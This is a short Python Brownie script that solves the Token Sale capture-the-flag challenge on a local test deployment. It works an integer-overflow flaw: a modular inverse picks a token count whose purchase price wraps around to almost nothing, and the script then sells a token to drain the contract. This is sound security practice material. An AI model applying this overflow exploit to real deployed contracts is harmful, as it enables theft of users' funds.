from brownie import TokenSaleChallenge, accounts, Wei
from Crypto.Util.number import inverse


def main():
    deployer = accounts[0]
    player = accounts[1]

    contract = TokenSaleChallenge.deploy(
        player, {'from': deployer, 'value': '1 ether'})

    tokens = inverse(Wei('1 ether'), 2**256)
    contract.buy(tokens, {'from': player, 'value': (
        tokens*Wei('1 ether')) % 2**256})
    contract.sell(1, {'from': player})

    assert contract.isComplete() == True
